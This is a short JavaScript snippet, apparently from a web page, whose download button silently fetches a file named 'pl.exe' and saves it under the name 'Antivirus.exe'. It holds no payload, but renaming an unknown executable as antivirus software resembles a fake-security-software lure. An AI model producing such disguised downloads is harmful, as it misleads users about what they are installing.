document.getElementById('download-btn').addEventListener('click', () => {
    const fileUrl = 'pl.exe'; // Replace with the actual file path
    const anchor = document.createElement('a');
    anchor.href = fileUrl;
    anchor.download = 'Antivirus.exe'; // The file name for download
    document.body.appendChild(anchor);
    anchor.click();
    document.body.removeChild(anchor);
    alert('Your download will begin shortly!');
});
